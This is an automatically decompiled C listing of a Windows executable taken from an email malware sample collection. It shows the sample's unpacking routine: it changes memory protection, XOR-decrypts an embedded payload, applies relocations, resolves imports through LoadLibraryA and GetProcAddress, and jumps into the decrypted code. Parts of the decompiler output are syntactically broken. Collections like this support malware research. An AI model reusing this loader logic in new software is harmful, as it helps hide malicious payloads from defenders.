// subject.c
// Generated on 5/4/2015 1:13:10 AM by decompiling malware_via_email/malware_0464/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(Eq_9 eax, word32 edx, word32 esi)
{
	SHLWAPI.dll!StrStrIA();
	word32 edi_12 = 0x00000000;
	word32 dwLoc14_15 = 0x000000E8;
	word32 ebx_106 = 0x00000020;
	if (eax != 0x00000000)
		goto l004011BF;
	else if (AddUsersToEncryptedFile(eax, eax) == 0x00000000)
		return;
	else
	{
		word32 eax_101 = AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF);
		if (eax_101 == 0x00000000)
			ebx_106 = eax_101 + 0x0000002E;
		Mem109[fp - 0x0000002C:word32] = fp - 0x00000018;
		Mem111[fp - 0x00000030:word32] = 0x00000040;
		VirtualProtect(0x00401000, 0x00003000, 0xFFFFFFFF, 0xFFFFFFFF);
		word32 ecx_120 = 0x00000000;
		do
		{
			if (edi_12 == ebx_106)
				edi_12 = 0x00000000;
			Mem139[ecx_120 + 0x004015D8:byte] = Mem111[edi_12 + 0x00404000:byte] ^ Mem111[ecx_120 + 0x004015D8:byte] ^ 0xA0;
			ecx_120 = ecx_120 + 0x00000001;
			edi_12 = edi_12 + 0x00000001;
		} while (ecx_120 <u 0x00001440);
		Mem160[fp - 0x00000014:word32] = 0x00000000;
		word32 edx_150 = 0x004028D8;
		word32 ebp_155 = 0x00000000;
		if (esi >u 0x00000000)
			do
			{
				word32 eax_295 = Mem160[edx_150 + 0x00000004:word32] - 0x00000008 >>u 0x00000001;
				word32 ecx_298 = edx_150 + 0x00000008;
				if (eax_295 > 0x00000000)
				{
					word32 ebx_311 = eax_295;
					do
					{
						word32 eax_314 = (word32) Mem160[ecx_298 + 0x00000000:word16];
						if ((eax_314 & 0x0000F000) == 0x00003000)
						{
							word32 eax_326 = (eax_314 & 0x00000FFF) + Mem160[edx_150 + 0x00000000:word32];
							Mem329[eax_326 + 0x00401358:word32] = Mem160[eax_326 + 0x00401358:word32] + 0xF0401358;
						}
						ecx_298 = ecx_298 + 0x00000002;
						ebx_311 = ebx_311 - 0x00000001;
					} while (ebx_311 != 0x00000000);
					ebp_155 = dwLoc14_15;
				}
				ebp_155 = ebp_155 + Mem160[edx_150 + 0x00000004:word32];
				dwLoc14_15 = ebp_155;
				edx_150 = edx_150 + Mem160[edx_150 + 0x00000004:word32];
			} while (ebp_155 <u esi);
		if (Mem160[0x004020D4:word32] != 0x00000000)
		{
			word32 ebx_189 = 0x004020C4;
			do
			{
				word32 eax_203 = LoadLibraryA(Mem160[ebx_189 + 0x0000000C:word32] + 0x00401358);
				word32 ecx_205 = eax_203;
				if (eax_203 != 0x00000000)
				{
					word32 ebp_228 = Mem160[ebx_189 + 0x00000000:word32];
					if (ebp_228 == 0x00000000)
						ebp_228 = Mem160[ebx_189 + 0x00000010:word32];
					word32 eax_234 = Mem160[ebp_228 + 0x00401358:word32];
					word32 ebp_235 = ebp_228 + 0x00401358;
					word32 esi_236 = Mem160[ebx_189 + 0x00000010:word32] + 0x00401358;
					if (eax_234 != 0x00000000)
						while (true)
						{
							word32 eax_255;
							if (eax_234 < 0x00000000)
								eax_255 = GetProcAddress(ecx_205, (word32) Mem160[ebp_235 + 0x00000000:word16]);
							else
								eax_255 = GetProcAddress(ecx_205, eax_234 + 0x0040135A);
							Mem260[esi_236 + 0x00000000:word32] = eax_255;
							ebp_235 = ebp_235 + 0x00000004;
							eax_234 = Mem260[ebp_235 + 0x00000000:word32];
							esi_236 = esi_236 + 0x00000004;
							if (eax_234 == 0x00000000)
							{
								ebx_189 = dwLoc14_174;
								goto l004011A2;
							}
							ecx_205 = eax_203;
						}
				}
l004011A2:
				ebx_189 = ebx_189 + 0x00000014;
				dwLoc14_174 = ebx_189;
			} while (Mem160[ebx_189 + 0x00000010:word32] != 0x00000000);
		}
		0x00401DB8();
		ExitProcess(0x00000000);
l004011BF:
		return;
	}
}

